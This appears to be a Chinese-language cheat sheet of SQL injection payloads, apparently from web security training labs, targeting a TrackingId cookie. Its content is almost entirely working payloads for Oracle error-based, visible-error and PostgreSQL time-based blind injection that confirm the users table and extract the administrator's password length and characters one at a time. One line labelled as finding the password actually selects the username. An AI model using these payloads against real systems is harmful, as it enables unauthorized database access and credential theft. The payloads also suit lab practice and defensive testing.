## 报错注入 Oracle数据库

确认是否报错

```
TrackingId=xyz'
```

是否不报错

```
TrackingId=xyz''
```

测试无效报错

```
TrackingId=xyz'||(SELECT '')||'
```

测试有效数据库不报错

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

测试表名是否存在

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

测试表中是否含有administrator  报错及对 （case 类似于 if ，当条件为真就会报错）

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

判断密码位数

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

判断密码

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='参数' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

## 可见错误的SQL注入

测试

```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

找用户名

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

找密码

```
' AND 1=CAST((SELECT username FROM users) AS int)--
```

## 延时注入

如果前面条件成立 延时10秒，不成立延时0秒

```
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

```
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

判断用户名

```
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

判断密码长度

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

爆破密码

```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='参数')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```